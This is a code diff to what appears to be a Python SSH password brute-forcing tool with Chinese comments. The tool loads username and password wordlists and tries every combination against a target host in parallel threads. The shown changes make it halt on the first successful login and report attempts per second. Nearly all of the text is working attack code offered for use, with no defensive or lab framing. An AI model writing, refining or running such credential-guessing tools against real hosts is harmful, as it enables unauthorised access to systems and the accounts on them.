@@ -96,7 +96,6 @@ def getConfig(section: str, key: str, stmpPathConf: str) -> str:
 # SSH连接成功时的处理
 def Successed(username: str, password: str) -> None:
     print(f"[√]SSH连接成功! 账号: {username} 密码为：{password}")
-    exit(0)
 
 # SSH连接失败时的处理
 def Failed(reason: str) -> None:
@@ -156,19 +155,20 @@ def TrySSHLogin(hostname: str, SSHport: int, username: str, password: str) -> No
         print("[×]SSH登录失败")
 
 # 使用用户名和密码字典进行SSH连接尝试
-def sshClientConnection(hostname: str, SSHport: int):
+def sshClientConnection(hostname:str, SSHport: int):
     if PingIsOpenConnect(hostname, SSHport) is False:
-        Failed("目标主机未开启SSH服务")
+            Failed("目标主机未开启SSH服务")
     with open("username.txt", 'r', encoding='utf-8') as f:
         user_name = f.readlines()
     with open("password.txt", 'r', encoding='utf-8') as f:
         pass_word = f.readlines()
     
-    # 使用多线程加快尝试速度，并限制最大并发数
+    attempt_count = 0
+    start_time = time.time()
+    success = False
+
     with ThreadPoolExecutor(max_workers=5) as executor:
         futures = []
-        attempt_count = 0
-        start_time = time.time()
         for username in user_name:
             for password in pass_word:
                 futures.append(executor.submit(TrySSHConnection, hostname, SSHport, username.strip(), password.strip()))
@@ -177,15 +177,19 @@ def sshClientConnection(hostname: str, SSHport: int):
             result = future.result()
             attempt_count += 1
             if result[0] is True:
+                success = True
                 Successed(result[1], result[2])
-        
-        end_time = time.time()
-        duration = end_time - start_time
-        print(f"总尝试次数: {attempt_count}")
-        print(f"总耗时: {duration:.2f} 秒")
-        print(f"每秒尝试次数: {attempt_count / duration:.2f}")
+                executor.shutdown(wait=False)
+                break
     
-    Failed("[x]所有的字典都尝试完毕，没有找到合适的账号或密码。")
+    end_time = time.time()
+    duration = end_time - start_time
+    print(f"总尝试次数: {attempt_count}")
+    print(f"总耗时: {duration:.2f} 秒")
+    print(f"每秒尝试次数: {attempt_count / duration:.2f}")
+    
+    if not success:
+        Failed("[x]所有的字典都尝试完毕，没有找到合适的账号或密码。")
 
 # 使用RSA密钥和密码字典进行SSH连接尝试
 def sshRsaConnection(hostname: str, SSHport: int):
